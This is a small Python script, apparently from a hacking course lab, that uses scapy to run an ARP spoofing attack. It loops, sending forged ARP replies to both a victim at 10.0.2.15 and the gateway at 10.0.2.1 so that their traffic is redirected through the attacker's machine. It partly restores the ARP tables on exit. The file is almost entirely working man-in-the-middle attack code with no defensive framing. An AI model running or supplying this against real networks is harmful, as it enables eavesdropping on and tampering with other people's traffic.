#!/usr/bin/env python3

import scapy.all as scapy
# import optparse
import  time

def get_mac(ip):
    """
    Returns the mac address of IP
    :param ip: Ipaddress
    :return: Mac address of the client with specified IP
    """
    arp_request = scapy.ARP(pdst=ip)  # Create an ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Create a broadcast packet
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):
    """
    This function spoof the target's arp table by sending a response as from spoof_ip (gateway)
    :param target_ip: victim ip
    :param spoof_ip: gateway ip
    :return: None
    """
    target_mac = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  # op =2 denotes response packet
    # print(packet.show())
    # print(packet.summary())
    scapy.send(arp_response_packet, verbose=False)


def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(arp_response_packet, verbose=False)


try:
    sent_packets_count = 0
    while True:
        arp_spoof("10.0.2.15", "10.0.2.1")
        arp_spoof("10.0.2.1", "10.0.2.15")
        sent_packets_count += 2
        print("\r [+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore("10.0.2.15", "10.0.2.1")

